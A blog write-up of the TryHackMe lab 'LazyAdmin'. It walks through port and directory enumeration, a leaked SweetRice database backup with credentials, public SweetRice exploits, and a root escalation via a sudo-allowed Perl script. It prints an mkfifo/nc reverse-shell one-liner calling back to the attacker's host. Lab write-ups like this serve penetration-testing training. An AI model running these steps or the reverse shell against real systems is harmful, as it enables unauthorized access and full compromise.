---
title: "LazyAdmin Writeup THM"
description: "My writeup of the TryHackMe room [LazyAdmin](https://tryhackme.com/room/lazyadmin)"
date: 2024-01-02
image: https://images.unsplash.com/photo-1494256997604-768d1f608cac?q=80&w=2729&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
categories:
    - Room
    - Easy
---

The first thing that I am going to do is a nmap scan:

```bash
nmap 10.10.243.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 07:27 EST
Nmap scan report for 10.10.243.20
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
```

From there we can see that it has:

- 22(SSH)
- 80(HTTP)

First of all I am going to explore the web page.

We got meeted by the apache2 ubuntu default page, that’s good, because now weknow that it is an ubuntu machine and it’s running Apache2.

Now I am just going to run ffuf for directory enumeration:

```bash
ffuf -u http://10.10.243.20/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.243.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1172ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4189ms]
content                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 57ms]
:: Progress: [20469/20469] :: Job [1/1] :: 353 req/sec :: Duration: [0:00:38] :: Errors: 0 ::
```

As we can see we got a content page, let’s see what’s in here.

![Untitled](https://raw.githubusercontent.com/Blueaulo/LazyAdmin-writeup-THM/main/7474137c-0a7c-410b-8ed2-02a7b17020bd_Export-965f2a31-1018-4c8c-bca0-aab923e3538f/LazyAdmin%20e500b0ab8a7b40c8a695e2a7bb58621b/Untitled.png)

That’s great, now we know that the web page is using Basic CMS.

For now I am just going to follow the tip that the default web page gave us: “If you are the webmaster,please go to Dashboard -> General -> Website setting”.

but for doing that we first need to login and access the dashboard.

I ran another directory scanner, this time inside content:

```bash
ffuf -u http://10.10.243.20/content/FUZZ -w /usr/share/wordlists/dirb/big.txt


      /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.243.20/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1687ms]
_themes                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 55ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2705ms]
as                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms]
attachment              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 58ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 57ms]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 57ms]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms]
:: Progress: [20469/20469] :: Job [1/1] :: 271 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

The dashboard is located in /content/as.

But we don’t have the credentials yet.

I went into inc, and there we can see a mysql backup:

![Untitled](https://raw.githubusercontent.com/Blueaulo/LazyAdmin-writeup-THM/main/7474137c-0a7c-410b-8ed2-02a7b17020bd_Export-965f2a31-1018-4c8c-bca0-aab923e3538f/LazyAdmin%20e500b0ab8a7b40c8a695e2a7bb58621b/Untitled%201.png)

Here we can see the hashed password and the login username.

manager:Password123

Now we can see which version is running, after searching on internet I found this script: “https://www.exploit-db.com/exploits/40716”

```bash
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.243.20/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : php.php
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.243.20/content/attachment/php.php
```

This one didn’t work so I am going to switch to another one that I have found: “https://www.exploit-db.com/exploits/40700”

It bascially tells you to go and add a file in the ads section.

after that we just navigate to the ads directory “http://10.10.243.20/content/inc/ads/” and we have our shell:

```bash
nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.243.20] 35430
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 15:20:14 up 53 min,  0 users,  load average: 0.00, 0.00, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Going to the IT guy directory gives us the user flag.

Now using sudo -l:

```bash
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

We can see that we can use perl and backup.pl with root privileges.

```bash
cat /home/itguy/backup.pl

#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

This basically just execute the `/etc/copy.sh` file

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.20.116 4555 >/tmp/f
```

So I changed the cdoe with my ip and port, then executed with: sudo /usr/bin/perl /home/itguy/backup.pl and got the shell.

```bash
nc -lvnp 4555
listening on [any] 4555 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.243.20] 56612
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
